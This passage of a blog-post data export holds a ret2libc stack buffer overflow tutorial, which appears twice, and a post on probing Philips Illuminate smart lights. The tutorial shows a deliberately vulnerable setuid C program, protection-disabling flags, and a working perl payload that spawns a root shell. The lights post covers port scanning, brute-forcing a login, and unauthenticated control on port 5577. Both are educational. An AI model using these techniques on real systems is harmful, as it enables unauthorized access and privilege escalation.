raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gef➤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gef➤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n","cover":"2019/01/gef.jpg","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gef➤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gef➤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  gdb -q bin/sof\n    \n    @gef➤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gef➤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gef➤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gef➤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gef➤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gef➤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gef➤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    ⇒  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    ⇒\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n"},{"title":"i didn't hack my christmas tree lights","slug":"didnt-hack-my-christmas-lights","date_published":1545882584000,"date_updated":1545882612000,"tags":[],"excerpt":"\nSometimes you go to Target and fall in love with the most stupid and useless yet incredibly cool product you could buy with the spare $100 you don't really have and sometimes you are even lucky enough to find a product that:\n\n1. lights up\n2. is connected to the internet\n\nwhich personally are my two favorite things. Oh, and it's Christmastime?? Enter the Philips Illuminate Starter Kit of 25 C9-sized LED lights. \n\nWhile many wi-fi app controlled LED lights come in LED light strip form, these lights in particular come attached to each other on a typical Christmas light string setup, but at the end of the cord about a foot from the plug is a green control box. 25 lights isn't really enough to make a standard Christmas tree look good, so I bought some supplemental lights and hooked these babies up then got them connected to my wifi ASAP. You can buy additional Philips Illuminate branded extension light strings to hook up to your main strand, which maxes out at 300 lights per control box.\n\n![](2018/12/IMG_3415.jpg \"a mix of birbs, the colored Philips lights, and a strand of normal lights. note the green control box to the bottom left\")\n\nIn order to connect to your Philips Illuminate lights, you download the Illuminate app, connect to the wifi the control box emanates, and provide the control box with the login to your home wifi. Once you hook the control box up to your home wifi, everything is all set for app control. The app can do A Bunch of Cool Things, including a huge amount of pre-programmed light patterns, the ability to make your own custom patterns, and a mode where the lights react to your voice... super creepy but great for the cool trick factor. \n\nThe ease of this all means the lights are absolutely worth the sale price of $79.99 (originally $99.99!), right? But it'd be nice to get them to do a little more, or at least be able to deconstruct how they work. After running through the programs available on the app, creating my own programs on the app, and poking around to see if anybody had created a custom firmware for these yet, I got to the point where I started getting a bit more curious about the security of the Philips Illuminate light set. \n\nFirst of all, if these things are on my wifi network, they've got to have an IP address and my particular starting point for poking at things on my network is to do an nmap scan:\n\n![](2018/12/image-19.jpg)\n\nChoose whatever nmap scan you want, but this one hits all the ports tcp and udp so you can get a general idea of what the network functions of this device are. From this scan, I've got the easily recognizable port 80 which indicates we can browse to http://192.168.50.37 on my home network and see what's up there. I also see a pretty neat option with port 5577, which led me down a huge rabbit hole. I've never messed with smart home devices before, but apparently port 5577 is a standard control port for issuing commands to networked LED devices with a certain set of controllers. In the UDP zone, there's port 53!! Is this thing running a DNS server? There's also those various high level UDP ports which could offer up some interesting information.\n\nIn the interest of keeping things simple, I started with the port 80 web interface. By browsing to the IP address, I got a login prompt where I tried every different formulation of admin/admin, admin/password, root/[blank]... nothing.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.24.57-AM.jpg \"a challenge\")\n\nAlso note the truly beautiful shade of pink you get upon failed login... the kind of pink that makes you want to attempt more.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.29.47-AM.jpg \"heck.\")\n\nAt this point I was pretty okay with trying anything I could to get into what I assumed was a web interface to change settings with the lights. Following t[his](https://support.portswigger.net/customer/portal/articles/1964020-using-burp-to-brute-force-a-login-page) article about using Burp to brute force a login page yielded no results. [This](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/) article about using Hydra to brute force a login page... **also** yielded no results. Double heck! \n\n***NOTE:*** Both of the brute force options would have worked if I had a certain reversed common username in any of the wordlists I used... remember to use good wordlists, pals. But I didn't, so I carried on.\n\nThe next thing I wanted to try was getting a PCAP of the app issuing commands to the lights, because maybe the password would be visible over the wire! At this point I was mistakenly assuming that the app was issuing API calls over port 80 via authenticated HTTP at the very least. I didn't have an easy way right off the bat to grab a PCAP, so I turned to asking people around me what they'd do next. We ended up decompiling the Philips Illuminate APK to try and find the password. It was a really great way to get a crash course in Android app development, but didn't yield any results HTTP login password-wise. I did get a bit more information about these lights though: the original developer is a company called Zengge and also got some model information from examining the APK. I wasn't right about the HTTP posts for the control of the lights, so on to the next option.\n\nDoing more research about port 5577 gave me the confirmation that it was time to put these things on an isolated test network just to be able to make sure nothing else was messing with them and snatch a pcap of opening my app and issuing a series of on-off commands:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.13.02-PM.jpg \"things happening over port 5577!!\")\n\nand look! Confirmation that commands are indeed issued over port 5577. But how can you confirm for absolutely certain that it's not just random chatter? Follow the streams:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.26.26-PM.jpg \"Repetitive commands being issued! Hooray!\")\n \nThat's what a series of on-off commands looks like, and here's what a series of switching between the two custom programs I made on the app look like: \n\n![](2018/12/Screen-Shot-2018-12-25-at-4.36.31-PM.png \"a bit more complex\")\n\nSo as you can see, a bit more complicated when you get into the fancy settings like color changes and fade speeds. When looking through the pcaps for different kinds of requests, there's not a whole bunch more information beyond the promise of the ability to issue totally unauthenticated commands. This makes it unnecessary to have the HTTP page login for the purposes of controlling the lights without the app, but I was still really interested in finding the password. What was that terrible pink 404 error hiding?\n\nOur next port to explore was confirmed as the one interesting artifact I found in the PCAPs I took: this controller randomly spits out the either the ip address, hostname, mac address in a string or every so often a string of \"HF-A11ASSISTHREAD\" over UDP on port 48899. \n\n![](2018/12/Screen-Shot-2018-12-26-at-1.46.48-PM.png \"a friendly network device\")\n\nThis didn't correspond with any hostnames, so I immediately threw it into Google and found out some excellent information about the Zengge Lightbulb manufacturing company thanks to [vikstrous on Github](https://github.com/vikstrous/zengge-lightcontrol). This source not only gave me some insight onto what's going on with this magical box and lights, but also the admin/password to login to the web interface (finally)!\n\nWhat is going on here anyways? What we know at this point is that there's 25 LEDs controlled by a control box. The control box has a wifi card in it which has the ability to not only broadcast but also connect to a wifi network. This card also runs a UART (Universal Asynchronous Receiver/Transmitter) that accepts commands over port 5577. The mysterious port 48899 is the ability to control some options for the device, but lucky for me the default HTTP login found on the internet for the device works!\n\n![](2018/12/Screen-Shot-2018-12-25-at-5.37.14-PM.jpg \"Answers!\")\n\nHere is where we can configure some cool information about the device's settings for sending and receiving commands, but honestly I'm not even going to touch it – since what I was really hoping for was a web interface to control the lights themselves, not really the device that controls communication to them. \n\nAn additional part of this adventure that doesn't really fit into the rest of the research is that Philips is just the distributor for this product which is made by Seasonal Specialties, a company founded in 1996. [Seasonal Specialities](http://www.seasonalspecialties.com) has a website that was created in Microsoft Frontpage 5.0 but also a [wordpress with a default login page](http://www.seasonalspecialties.com/wp/wp-login.php) operating on the same web host. Yikes. These details tell me security isn't exactly a major concern at Seasonal Specialities, yet these lights are a really nicely made product so I would like to tell them to please start caring! If you go through all of the trouble to rebrand the Zenegge light parts into something that becomes a well-constructed nicely working set of Christmas lights, why not go the extra mile and figure out how to cover up their lack of security? \n\nLuckily, I've got what I need to start creating the foundation for controlling the lights without the Philips Illuminate app. I have a model of UART Controller and lights, I know that the commands aren't sent with any authentication, and I could conceivably find a way to send commands via my Raspberry Pi or create my own web interface for their control. Simply telnetting to port 5577 and repeating the same strings observed in the PCAP back at the device doesn't really work... So now it's just a matter of finding out what packages are out there to interact with this controller or building my own. I'm also tempted to see if any of the [OpenHab](https://www.openhab.org/addons/bindings/wifiled/) extensions can play nice with these lights. Either way, I haven't really hacked my Christmas lights, I just found out a TON of information about how they work and function. The true hack will come when I find a way to make them work without their intended supporting software. \n\nThanks to some sources:\n\n[https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/](https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/)\n\n[https://github.com/renebohne/wifirgbcontroller](https://github.com/renebohne/wifirgbcontroller)\n\n[https://www.openhab.org/addons/bindings/wifiled/](https://www.openhab.org/addons/bindings/wifiled/)\n\n[https://github.com/vikstrous/zengge-lightcontrol](https://github.com/vikstrous/zengge-lightcontrol)\n","cover":"2018/12/A7B65125-AF02-44C0-8FBF-0D2D0236161F-1.jpg","author":{"name":"kimb3r","avatar":"avatars/kimb3r.jpg"},"content":"\nSometimes you go to Target and fall in love with the most stupid and useless yet incredibly cool product you could buy with the spare $100 you don't really have and sometimes you are even lucky enough to find a product that:\n\n1. lights up\n2. is connected to the internet\n\nwhich personally are my two favorite things. Oh, and it's Christmastime?? Enter the Philips Illuminate Starter Kit of 25 C9-sized LED lights. \n\nWhile many wi-fi app controlled LED lights come in LED light strip form, these lights in particular come attached to each other on a typical Christmas light string setup, but at the end of the cord about a foot from the plug is a green control 